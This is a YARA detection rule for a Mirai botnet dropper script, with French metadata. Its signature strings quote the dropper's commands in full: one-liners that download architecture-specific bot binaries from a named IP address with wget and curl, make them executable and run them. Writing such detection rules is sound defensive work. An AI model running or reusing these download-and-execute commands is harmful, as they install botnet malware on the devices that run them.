rule SCRIPT_Dropper_Mirai_ForgeAuto_3691d3e4
{
    meta:
        author = "Marjoriefort"
        description = "Detects Mirai (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "3691d3e45d288500e19250166ff256edcc273e2531ebee392312fc3a6ed52e8d"
        yarahub_uuid = "6e39c1a9-b928-4ecd-a436-f43e012077c7"
        famille = "Mirai"
        famille_source = "reputation"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "e67f7474cf7d3ca6df23a9991bb3134e"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "/bin/bash" ascii
        $s1 = "ulimit -n 1024" ascii
        $s2 = "cp /bin/busybox /tmp/" ascii
        $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.89.160.48/bins/parm; curl -O http://64.89.160.48/bins/parm; cat parm > SSH; chmod +x *; ./SSH SSH" ascii
        $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.89.160.48/bins/parm5; curl -O http://64.89.160.48/bins/parm5; cat parm5 > SSH; chmod +x *; ./SSH SSH" ascii
        $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.89.160.48/bins/parm6; curl -O http://64.89.160.48/bins/parm6; cat parm6 > SSH; chmod +x *; ./SSH SSH" ascii
        $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.89.160.48/bins/parm7; curl -O http://64.89.160.48/bins/parm7; cat parm7 > SSH; chmod +x *; ./SSH SSH" ascii
        $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.89.160.48/bins/pmips; curl -O http://64.89.160.48/bins/pmips; cat pmips > SSH; chmod +x *; ./SSH SSH" ascii
        $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.89.160.48/bins/pmpsl; curl -O http://64.89.160.48/bins/pmpsl; cat pmpsl > SSH; chmod +x *; ./SSH SSH" ascii
        $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.89.160.48/bins/pm68k; curl -O http://64.89.160.48/bins/pm68k; cat pm68k > SSH; chmod +x *; ./SSH SSH" ascii
        $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.89.160.48/bins/pppc; curl -O http://64.89.160.48/bins/pppc; cat pppc > SSH; chmod +x *; ./SSH SSH" ascii
        $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.89.160.48/bins/psh4; curl -O http://64.89.160.48/bins/psh4; cat psh4 > SSH; chmod +x *; ./SSH SSH" ascii
        $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.89.160.48/bins/pspc; curl -O http://64.89.160.48/bins/pspc; cat pspc > SSH; chmod +x *; ./SSH SSH" ascii
        $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.89.160.48/bins/px86; curl -O http://64.89.160.48/bins/px86; cat px86 > SSH; chmod +x *; ./SSH SSH" ascii
        $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://64.89.160.48/bins/x86_64; curl -O http://64.89.160.48/bins/x86_64; cat x86_64 > SSH; chmod +x *; ./SSH SSH" ascii
    condition:
        true and filesize < 50MB and 2 of ($s0, $s1, $s2) and 1 of ($s3, $s4, $s5, $s6, $s7, $s8, $s9, $s10, $s11, $s12, $s13, $s14)
}
